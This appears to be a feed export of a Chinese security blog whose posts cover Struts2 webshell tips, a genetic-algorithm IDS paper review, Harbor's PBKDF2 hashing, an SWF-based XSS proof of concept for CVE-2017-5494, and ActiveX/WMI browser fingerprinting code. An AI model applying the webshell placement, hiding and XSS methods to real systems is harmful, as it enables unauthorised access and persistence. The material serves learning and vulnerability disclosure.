&lt;p&gt;3.负载均衡&lt;/p&gt;
&lt;p&gt;测试中发现，很多Jboss的站会用到负载均衡，导致shell 404，这种情况一种是多试几次，反正有一次应该能够连上，一种是保证每台机器上都有Wenshell。&lt;/p&gt;
&lt;p&gt;————————————————————&lt;/p&gt;
&lt;p&gt;4.无法上传&lt;/p&gt;
&lt;p&gt;根据朋友讲的他遇到的经历，无法上传主要有以下几种情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有防护软件进行文件查杀，这种可以通过一些特殊的Shell来绕过&lt;/li&gt;
&lt;li&gt;长度限制，这种存在于一些服务器对于请求包有所限制，导致过长的shell无法成功上传。&lt;/li&gt;
&lt;li&gt;在手动写文件时，还有些服务器禁用echo等写文件命令也会导致文件出错&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;0x04-其他&quot;&gt;&lt;a href=&quot;#0x04-其他&quot; class=&quot;headerlink&quot; title=&quot;0x04 其他&quot;&gt;&lt;/a&gt;0x04 其他&lt;/h2&gt;&lt;p&gt;在实际测试中发现，许多struts2的应用广泛使用了许多其他中间件，比如Hiberate、HyperSQL、FirebirdSQL等等平时没有使用到的框架或者数据库，还有会使用其他Web服务器的情况，比如JBoss。&lt;/p&gt;
&lt;p&gt;————————————————————2017.3.23 更新&lt;/p&gt;
&lt;p&gt;这里在补充一下shell方面的学习&lt;/p&gt;
&lt;p&gt;1.war包shell&lt;/p&gt;
&lt;p&gt;这种需要服务器开启了热部署相关的应用才能使用，当然~~你愿意重启整个WEB服务也可以，将jsp和WEB-INF打包成一个war包上传，可以实现一个新的路径下的访问。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.freebuf.com/articles/web/36455.html&quot; title=&quot;http://www.freebuf.com/articles/web/36455.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.freebuf.com/articles/web/36455.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这篇文章提到了具体的操作步骤。&lt;/p&gt;
&lt;p&gt;2.jspx shell&lt;/p&gt;
&lt;p&gt;园长在乌云上的JavaWeb系列讲解过，jspx是以xml语法来写jsp文件。个人理解是使用xml语法来规范jsp语法到html。&lt;/p&gt;
&lt;p&gt;当然园长的文章中提到，只要修改tomcat的conf中的web.xml，可以任意后缀解析。&lt;/p&gt;
&lt;p&gt;3.shell隐藏&lt;/p&gt;
&lt;p&gt;同样JavaWeb系列文章中提到了诸如jar包等隐藏方法。&lt;/p&gt;
&lt;p&gt;这里我复现的是91ri的《利用 Java Binary Webshell 对抗静态检测》，里面提到在tomcat下通过修改Catalina的配置文件，来做jsp文件更改延迟，达到欺骗引擎一直返回给浏览器字节码的目的，进而将Webshell隐藏在字节码中，实现无shell jsp文件下的理论上的权限维持&lt;/p&gt;
&lt;p&gt;当然，说是理论上，因为Tomcat只能延迟检测，不能完全去除检测，不知道对Tomcat框架理解深入的大牛们有没有方法完全规避检测~~&lt;/p&gt;
&lt;p&gt;————————————————————&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;Struts2的环境有时候显得有些庞大而复杂，这里借着漏洞学习的过程了解一下Tomcat+Struts2架构的一些问题，这么一看重要的学习其他而不是漏洞了~~。&lt;/p&gt;
&lt;p&gt;修改：2017.3.23&lt;br&gt;
    
    </summary>
    
      <category term="JAVA" scheme="http://phantom0301.coding.me/categories/JAVA/"/>
    
    
      <category term="struts2" scheme="http://phantom0301.coding.me/tags/struts2/"/>
    
      <category term="漏洞学习" scheme="http://phantom0301.coding.me/tags/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>英文文献阅读-使用遗传算法的异常入侵检测</title>
    <link href="http://phantom0301.coding.me/2017/03/05/ids-ga/"/>
    <id>http://phantom0301.coding.me/2017/03/05/ids-ga/</id>
    <published>2017-03-05T06:14:15.000Z</published>
    <updated>2017-03-05T07:35:35.096Z</updated>
    
    <content type="html">&lt;p&gt;基于遗传算法进行入侵检测&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-算法基础&quot;&gt;&lt;a href=&quot;#0x01-算法基础&quot; class=&quot;headerlink&quot; title=&quot;0x01 算法基础&quot;&gt;&lt;/a&gt;0x01 算法基础&lt;/h2&gt;&lt;p&gt;阅读的文献是CCSIT 2012的一篇论文&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Srinivasa K G. Application of Genetic Algorithms for Detecting Anomaly in Network Intrusion Detection Systems&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;论文的核心部分是在GA算法本身的描述上，遗传算法主要是为了解决优化问题，正如它的名字，它模仿了自然界的生物遗传特性，首先提取个体的特征，也就是基因，进行杂交获取不同于父辈的基因，然后使用某种标度去计算子代是否是最优解，如果不是就再一次杂交迭代。&lt;/p&gt;
&lt;h2 id=&quot;0x02-算法实现&quot;&gt;&lt;a href=&quot;#0x02-算法实现&quot; class=&quot;headerlink&quot; title=&quot;0x02 算法实现&quot;&gt;&lt;/a&gt;0x02 算法实现&lt;/h2&gt;&lt;p&gt;在入侵检测方面，文章利用GA算法来产生特征组，GA算法的伪代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Input:
    x[i],代表i时刻的payload
Output:
    fittest,适当的基因
begin:
    for i in [0,G]:
        min_dist = INFINITY
        fittest = 0
        for c in Chromosome:
            dist = manhattan_dis(c,x[i])
            if dist &amp;lt;= min_dist:
                fittest = i
                min_dist = dist
        crossover(fittest,x[i])
        for c in Chromosome:
            mutation(c)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中G是子代迭代次数，Chromosome是测试后适合加入种群的基因c的基因组，测量的标度是c和x的曼哈顿距离。&lt;/p&gt;
&lt;p&gt;另外还有两个函数，杂交函数crossover和变异函数mutation。&lt;/p&gt;
&lt;p&gt;如伪代码所表示的，在一次次的子代繁殖中，确定出当前的测量值dist，然后将子代与这一代的基因进行杂交，杂交后会产生新的基因组种群，为了快速探索到整个特征空间，引入变异函数来加快这一探索过程。&lt;/p&gt;
&lt;p&gt;杂交函数伪代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Input:
    x[i]
    fittest 合适的基因
Output：
    子代及子代基因，如果满足条件，加入基因组
begin：
    Children[6] = Cross(fittest,x[i])
    杂交后产生的除去2个与父代相同的子代后剩下的6个子代（很拗口的一句话，总之就是2个父代——8个子代——减去2个子代=6个子代）
    for c in Children:
        if fitness(c) &amp;gt; threshold:大于临界值
            add_to_population(c)将该基因加入种群
    remove(fittest)移除父代
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;变异函数如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Input：
    c 基因组内基因
Output：
    c&amp;apos; 变异基因
begin：
    r = random()
    if r &amp;gt; pm(变异可能性):
        mutate(c)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;生成一个随机数，如果它大于变异率，即变异发生。&lt;/p&gt;
&lt;p&gt;当然，这里还有两个问题，杂交和变异到底如何表示，遗传学里的孟德尔的豌豆实验对于两组特征AaBb的豌豆杂交，产生多种基因组合的子代就是杂交，而变异就是一个子代本来是aabb，但是当变异发生，可能会成为Aabb。&lt;/p&gt;
&lt;p&gt;上面是生物学的描述方法，那么在计算机中我们就可以用编码来描述基因，比如一个特征1的编码可以是0001,2编码为0010.那么每两个二进制的数位代表一个基因，1和2杂交可以产生出0000,0001，0010三种子代，当然如果等概率假设的话实际数目应该是4个子代，三种基因。那么，这时，如果产生变异，0010就有可能成为0011，以此类推。&lt;/p&gt;
&lt;p&gt;而在这里，最后的基因组就是异常行为的特征值组。&lt;/p&gt;
&lt;h2 id=&quot;0x03-疑惑&quot;&gt;&lt;a href=&quot;#0x03-疑惑&quot; class=&quot;headerlink&quot; title=&quot;0x03 疑惑&quot;&gt;&lt;/a&gt;0x03 疑惑&lt;/h2&gt;&lt;p&gt;整个论文的核心其实就是上述的一整套算法，接着论文利用这套算法与另一篇论文中的PAYL进行对比，并最终得到结论，论文的算法拥有更高的检出率和更低的误报率，并且训练速度较快。&lt;/p&gt;
&lt;p&gt;这里还有几点疑惑，首先，遗传算法重要的一个研究点就是如何定义基因，或者说是编码，而论文中并没有提出这种编码机制。其次，如果没理解错的话，文中的payload仅使用目标地址和目标端口，这种选取是否合适。另外，就是文中的伪代码描述也不是很清晰。&lt;/p&gt;
&lt;p&gt;当然，这篇文章有可能是建立在其他GA-IDS文章的基础上所以省略了上述说明。&lt;/p&gt;
&lt;p&gt;句式：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In our system we use a two point crossover scheme where the two parents crossover at two different points producing a total of eight off springs out of which two are replicas of the parents itself which are discarded.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;好长的一段话，大意就是说这个两点杂交会产生8个子代，而和父代完全一样的两个子代会被丢弃。主句是we use a two point crossover scheme。where修饰前句，the two parents crossover producing a total of……，然后out of which two指代前面的offsprings，再下一个which修饰two。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;基于遗传算法进行入侵检测&lt;/p&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://phantom0301.coding.me/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="GA" scheme="http://phantom0301.coding.me/tags/GA/"/>
    
      <category term="IDS" scheme="http://phantom0301.coding.me/tags/IDS/"/>
    
  </entry>
  
  <entry>
    <title>Harbor中的用户密码加密机制探究</title>
    <link href="http://phantom0301.coding.me/2017/02/08/harborpass/"/>
    <id>http://phantom0301.coding.me/2017/02/08/harborpass/</id>
    <published>2017-02-08T13:22:53.000Z</published>
    <updated>2017-02-09T02:09:20.530Z</updated>
    
    <content type="html">&lt;p&gt;我们一般自己写个小程序做用户验证的时候，大多数情况都是用MD5，sha1，好一点的再加个盐，这次让我们来看看开源软件中的用户密码加密都是怎么实现的。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-Harbor简介&quot;&gt;&lt;a href=&quot;#0x01-Harbor简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 Harbor简介&quot;&gt;&lt;/a&gt;0x01 Harbor简介&lt;/h2&gt;&lt;p&gt;Project Harbor是由VMware公司中国团队为企业用户设计的Registry server开源项目。主要用于Docker镜像仓库的管理。&lt;/p&gt;
&lt;p&gt;嗯，简介就到这里。&lt;/p&gt;
&lt;h2 id=&quot;0x02-算法探究&quot;&gt;&lt;a href=&quot;#0x02-算法探究&quot; class=&quot;headerlink&quot; title=&quot;0x02 算法探究&quot;&gt;&lt;/a&gt;0x02 算法探究&lt;/h2&gt;&lt;p&gt;在Harbor的数据库中看到了这样一条用户验证的存储信息。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;| username  | password                         | salt                             |
| test      | 65e900b5a2bdff474e29d0d2b21f4945 | gktqer4zml32472wmht9xeuixvg5pvjd |
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;test账户的明文密码为 &lt;strong&gt;123QWEqwe&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;看到如上的数据库结构，32位的散列，猜测多半就是MD5（password+salt）的加密套路，然而事实证明我还是太年轻，无论我如何改变密码和盐的组合，都无法得到数据库中的密码散列，为了节省大家尝试的时间，我就把几种组合方式的结果罗列在下面：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;MD5(p+s): 7bd52852dd48c4375aa29bd73e125183&lt;/p&gt;
&lt;p&gt;MD5(s+p): c01fb693df3c524442149ff16d7d5fc8&lt;/p&gt;
&lt;p&gt;MD5(MD5(p)+s): 87b9168b430edb9fcfd03474c7f35ac0&lt;/p&gt;
&lt;p&gt;MD5(MD5(s)+p): d70ffc1ace99fa8d7e52ef3e29907a54&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;……&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;常识性的MD5猜测竟然都没有正确，那么可能的加密方式就难以捉摸了，SHA1后截断？，HMAC？&lt;/p&gt;
&lt;p&gt;首先想到的是去Harbor的官档里找答案，不过大概翻阅了可能的官方文档后，并没有找到对它加密方式的记录。但是在Github的一个issue中，有许多人关于PBKDF2的讨论，会不会是使用这种加密方式呢？&lt;/p&gt;
&lt;p&gt;通过查阅资料得知（中文维基竟然没有关于PBKDF2的解释条目，我的姿势不对？），PBKDF2是一种基于密码的密钥生成函数。&lt;br&gt;这种算法有5个输入参数，如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;DK = PBKDF2(PRF, Password, Salt, c, dkLen)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PRF是一个伪随机函数，Password是主密码，Salt是盐值，c是算法迭代次数，dkLen是产生密钥的长度。&lt;/p&gt;
&lt;p&gt;那么到这里，我们就需要去读Harbor的源代码来获取算法中的几个常数参数来验证我们的思路。&lt;/p&gt;
&lt;p&gt;Harbor中的代码主要有两种语言构成，Go和AngularJS，这两种都是我没有实践过的语言，定位它的加密函数花费了不少时间。&lt;/p&gt;
&lt;p&gt;首先我们找到Harbor src源码中ui的main.go，可以发现其中有关于密码方面的操作调用了dao这个包，而在dao包中有一个文件叫user.go，其中有个函数LoginByDb，LoginByDb有代码段如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if user.Password != utils.Encrypt(auth.Password, user.Salt)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以得知，它的加密用的是utils中的Encrypt。&lt;/p&gt;
&lt;p&gt;再跟踪Encrypt函数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;func Encrypt(content string, salt string) string {
    return fmt.Sprintf(&amp;quot;%x&amp;quot;, pbkdf2.Key([]byte(content), []byte(salt), 4096, 16, sha1.New))
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;果然，Harbor确实使用了pbkdf2算法，调用的Hash函数为Sha1，迭代4096次，密钥长度为int型16位。&lt;/p&gt;
&lt;p&gt;为了验证方便，我在github上&lt;a href=&quot;https://github.com/mitsuhiko/python-pbkdf2/blob/master/pbkdf2.py&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/mitsuhiko/python-pbkdf2/blob/master/pbkdf2.py&lt;/a&gt;找到了一个pbkdf2的python实现，主要代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import hmac
import hashlib
from struct import Struct
from operator import xor
from itertools import izip, starmap


_pack_int = Struct(&amp;apos;&amp;gt;I&amp;apos;).pack
def pbkdf2_hex(data, salt, iterations=4096, keylen=16, hashfunc=None):
    return pbkdf2_bin(data, salt, iterations, keylen, hashfunc).encode(&amp;apos;hex&amp;apos;)

def pbkdf2_bin(data, salt, iterations=4096, keylen=16, hashfunc=None):
    hashfunc = hashfunc or hashlib.sha1
    mac = hmac.new(data, None, hashfunc)
    def _pseudorandom(x, mac=mac):
        h = mac.copy()
        h.update(x)
        return map(ord, h.digest())
    buf = []
    for block in xrange(1, -(-keylen // mac.digest_size) + 1):
        rv = u = _pseudorandom(salt + _pack_int(block))
        for i in xrange(iterations - 1):
            u = _pseudorandom(&amp;apos;&amp;apos;.join(map(chr, u)))
            rv = starmap(xor, izip(rv, u))
        buf.extend(rv)
    return &amp;apos;&amp;apos;.join(map(chr, buf))[:keylen]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;调用相关函数进行测试，&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def check(data, salt, iterations, keylen, expected):
    rv = pbkdf2_hex(data, salt, iterations, keylen)
    if rv == expected:
        print &amp;apos;Test Successful:&amp;apos;
        print &amp;apos;  Expected:   %s&amp;apos; % expected
        print &amp;apos;  Got:        %s&amp;apos; % rv
        print &amp;apos;  Parameters:&amp;apos;
        print &amp;apos;    data=%s&amp;apos; % data
        print &amp;apos;    salt=%s&amp;apos; % salt
        print &amp;apos;    iterations=%d&amp;apos; % iteration
check(&amp;apos;123QWEqwe&amp;apos;, &amp;apos;gktqer4zml32472wmht9xeuixvg5pvjd&amp;apos;, 4096, 16,
      &amp;apos;65e900b5a2bdff474e29d0d2b21f4945&amp;apos;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170209100351.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;得到了和数据库中相同的结果。&lt;/p&gt;
&lt;h2 id=&quot;0x03-结束语&quot;&gt;&lt;a href=&quot;#0x03-结束语&quot; class=&quot;headerlink&quot; title=&quot;0x03 结束语&quot;&gt;&lt;/a&gt;0x03 结束语&lt;/h2&gt;&lt;p&gt;上面提出的Hash密码的算法在国外普遍被接受并运用于密码保护中，可以有效抵抗彩虹表爆破，但是国内这方面的加密往往还是用最基本的几种方式。在今后的程序编写中，可以尝试使用这些更安全的Hash算法。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;我们一般自己写个小程序做用户验证的时候，大多数情况都是用MD5，sha1，好一点的再加个盐，这次让我们来看看开源软件中的用户密码加密都是怎么实现的。&lt;br&gt;
    
    </summary>
    
      <category term="安全基础" scheme="http://phantom0301.coding.me/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="harbor" scheme="http://phantom0301.coding.me/tags/harbor/"/>
    
      <category term="pbkdf2" scheme="http://phantom0301.coding.me/tags/pbkdf2/"/>
    
      <category term="密码学" scheme="http://phantom0301.coding.me/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Swf文件利用姿势学习-CVE-2017-5494</title>
    <link href="http://phantom0301.coding.me/2017/02/06/cveswf/"/>
    <id>http://phantom0301.coding.me/2017/02/06/cveswf/</id>
    <published>2017-02-06T01:04:43.000Z</published>
    <updated>2017-02-06T03:41:14.262Z</updated>
    
    <content type="html">&lt;p&gt;年前学习审计的时候找到的一个CMS的小漏洞，漏洞的发现过程没有什么值得特别介绍的，不过flash的swf文件利用方法之前没有了解过，借此机会学习一下。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-漏洞简介&quot;&gt;&lt;a href=&quot;#0x01-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞简介&quot;&gt;&lt;/a&gt;0x01 漏洞简介&lt;/h2&gt;&lt;p&gt;CVE列表戳这里：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5494&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CVE-2017-5494&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;B2evolution是一个功能丰富的blog管理系统，可以建立多权限的社区管理平台。事实上，它的官网就是用自己的系统搭建的。而在它的6.8.4版本中，允许普通用户在设置头像或者评论博客时上传Swf文件，这就使得我们至少可以使用Swf文件来实现跨站脚本。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170206093315.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;上图是它在更新版本中的漏洞修复，将swf文件的上传权限设为admin。&lt;/p&gt;
&lt;h2 id=&quot;0x02-姿势利用&quot;&gt;&lt;a href=&quot;#0x02-姿势利用&quot; class=&quot;headerlink&quot; title=&quot;0x02 姿势利用&quot;&gt;&lt;/a&gt;0x02 姿势利用&lt;/h2&gt;&lt;p&gt;原理性的东西可以参考这一篇文章&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.secpulse.com/archives/44299.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.secpulse.com/archives/44299.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;B2evolution使用flowplayer来加载swf文件。&lt;br&gt;当然这和传统的flash SWF漏洞不太一样，传统的SWF漏洞是通过阅读服务器上的SWF源码，通过SWF执行时的一些输入参数来实现漏洞利用，而在这里，我们是可以任意上传一个SWF文件，也就是说，漏洞点什么的完全可以由我们构造，这样理解的话，我觉得CVE-2017-5494其实不单单是XSS这一种玩法，这其实更像是一个命令执行点。&lt;/p&gt;
&lt;p&gt;通过查阅资料，大致的payload可以有这两种构造方式：&lt;br&gt;一种是将SWF文件反编译后，直接在其中增加恶意代码&lt;br&gt;一种是反编译后，通过flash动画制作软件以动作-帧的方式添加脚本，没错，就是古老的网上一搜一大把的flash马的入门玩法。&lt;/p&gt;
&lt;p&gt;作为漏洞发掘，我使用第二种方式来快速构造执行文件。&lt;/p&gt;
&lt;p&gt;首先从网上下载一段正常的swf视频，反编译导出为fla格式，反编译工具有很多，《Web前端黑客技术揭秘》里提到过SWFScan和swfdump，当然其实不追求HACK仪式感的话，闪客精灵也能很好的完成这部分需求。&lt;/p&gt;
&lt;p&gt;反编译后，可以使用Macromedia Flash来制作，如图，可以直接使用软件带的函数快速插入功能，与浏览器及网络有关的函数主要说这两个：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;fscommand（） 可以直接执行命令的函数，不过只在本地有效。&lt;/li&gt;
&lt;li&gt;getURL（） 我用这个函数来实现与Javascript通信，当然，在AS3中它有新函数来代替，但它依然可用。利用这个函数，我们至少可以实现xss和网页跳转两个功能。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170206111214.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在打开的fla文件中添加如下动作，&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;getURL(&amp;quot;javascript:alert(1)&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后重新导出当前文件为swf影片，即可上传使用。&lt;/p&gt;
&lt;h2 id=&quot;0x03-本地实战&quot;&gt;&lt;a href=&quot;#0x03-本地实战&quot; class=&quot;headerlink&quot; title=&quot;0x03 本地实战&quot;&gt;&lt;/a&gt;0x03 本地实战&lt;/h2&gt;&lt;p&gt;下载B2evolution的6.8.4版，按照提示安装完成后，注册任意普通用户，并在数据库中强制完成邮箱认证&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170206113347.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;任意点击一篇文章，使用评论中的上传功能，上传构造好的swf文件，然后预览相应的文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170206113332.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;即可成功执行相应命令。&lt;/p&gt;
&lt;h2 id=&quot;0x04-写在后面&quot;&gt;&lt;a href=&quot;#0x04-写在后面&quot; class=&quot;headerlink&quot; title=&quot;0x04 写在后面&quot;&gt;&lt;/a&gt;0x04 写在后面&lt;/h2&gt;&lt;p&gt;毫无疑问的是，利用上述方法实现的漏洞利用还很有限，如果熟悉ActionScript的话就可以直接敲代码来实现更复杂的逻辑，进而实现更强大的功能，而且这种利用方式如果结合软件本身自带的一些JS插件（比如有一个上传的JS脚本，但是应用本身的实现是无法利用的，那么我们或许可以自己写一个swf来加载js上传文件？），说不定有意想不到的效果。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;年前学习审计的时候找到的一个CMS的小漏洞，漏洞的发现过程没有什么值得特别介绍的，不过flash的swf文件利用方法之前没有了解过，借此机会学习一下。&lt;br&gt;
    
    </summary>
    
      <category term="审计" scheme="http://phantom0301.coding.me/categories/%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="CVE" scheme="http://phantom0301.coding.me/tags/CVE/"/>
    
      <category term="swf" scheme="http://phantom0301.coding.me/tags/swf/"/>
    
  </entry>
  
  <entry>
    <title>前端用户指纹识别实践</title>
    <link href="http://phantom0301.coding.me/2016/12/08/jsuser/"/>
    <id>http://phantom0301.coding.me/2016/12/08/jsuser/</id>
    <published>2016-12-08T11:47:31.000Z</published>
    <updated>2016-12-09T01:58:25.813Z</updated>
    
    <content type="html">&lt;p&gt;声明：郑重声明我不会在自己的博客页面里嵌入这里提到的任何代码。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-突破与困境&quot;&gt;&lt;a href=&quot;#0x01-突破与困境&quot; class=&quot;headerlink&quot; title=&quot;0x01 突破与困境&quot;&gt;&lt;/a&gt;0x01 突破与困境&lt;/h2&gt;&lt;p&gt;在之前的博客里提到，曾经的那个网页和浏览器都很单纯的年代，网站服务端们靠着bling、bling的五颜六色的文字吸引着浏览器们的眼球，一切都是那么的相安无事，岁月静好。&lt;/p&gt;
&lt;p&gt;可是，蜜月不长，浏览器们就学会了提交一些不正常的数据给服务端，来让服务端出错。&lt;/p&gt;
&lt;p&gt;又过了一段时间，浏览器们需要服务端不断地视觉刺激，于是服务端们在原本单一的HTML排版中加入了动态语言来实现更多的逻辑，然而这远远满足不了上帝的口味，接下来，CSS/JS/HTML5等提供更强大视觉效果和交互功能的体系被用在前端的展示中。&lt;/p&gt;
&lt;p&gt;能力越大，责任越大，功能强劲的函数被编写支持，它的能力所带来的反噬效果也就越强大。原本用来突破性能瓶颈，优化用户体验的功能恰恰也带来了前端安全的困境。&lt;/p&gt;
&lt;h2 id=&quot;0x02-体验与隐私&quot;&gt;&lt;a href=&quot;#0x02-体验与隐私&quot; class=&quot;headerlink&quot; title=&quot;0x02 体验与隐私&quot;&gt;&lt;/a&gt;0x02 体验与隐私&lt;/h2&gt;&lt;p&gt;想要更好的体验吗？用你的隐私来交换吧~&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.ActiveXObject对象，被禁断的危险。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ActiveX 是一套广泛用于提供视频、动画内容的控件。它是微软的一个扩展，由于显而易见的危险，它只在IE中被支持，并且默认都是关闭的。即便你强行打开它的效果，现在的windows也会一直提醒你“赶快关上，没什么好用的”。总之，它是已经被封印了的及其危险的家伙，让我们一窥它的效果。&lt;br&gt;逻辑代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var locator = new ActiveXObject (&amp;quot;WbemScripting.SWbemLocator&amp;quot;); 
var service = locator.ConnectServer(&amp;quot;.&amp;quot;); 
var properties = service.ExecQuery(&amp;quot;SELECT * FROM Win32_Processor&amp;quot;);  
info+=&amp;quot;&amp;lt;tr  bgcolor=&amp;apos;#CDEDED&amp;apos; style=&amp;apos;font-weight: bold;&amp;apos; &amp;gt;&amp;lt;td width=&amp;apos;450&amp;apos; &amp;gt;CPU 信息&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
for (;!e.atEnd();e.moveNext ()) {   
    var p = e.item ();   
    info+=&amp;quot;&amp;lt;tr style=&amp;apos;color: red&amp;apos;&amp;gt;&amp;lt;td &amp;gt;CPU序列号:&amp;quot; + p.ProcessorID + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;&amp;quot;+p.Caption+&amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;CPU编号：&amp;quot;+p.DeviceID+&amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;CPU型号：&amp;quot; + p.Name + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;CPU状态：&amp;quot; + p.CpuStatus + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;CPU可用性：&amp;quot; + p.Availability + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;CUP Level：&amp;quot; + p.Level + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;主机名称：&amp;quot; + p.SystemName + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;Processor Type：&amp;quot; + p.ProcessorType + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;; 
}
return info;
}
fnShowPrcName(&amp;quot;Win32_StartupCommand&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;效果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20161208204109.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;如上所示，这种方式可以获取系统级的信息&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.navigator组函数，技能各异的兄弟。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Navigator对象包含了有关浏览器的信息，不同浏览器对它的支持各不相同，那么首先通过调用函数的回显就可以判断不同的浏览器了，主要在Firefox下对这一对象的方法进行了测试，以下函数都可以作为用户身份的一个分析维度。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;appCodeName，浏览器代码名————“Mozilla”&lt;/p&gt;
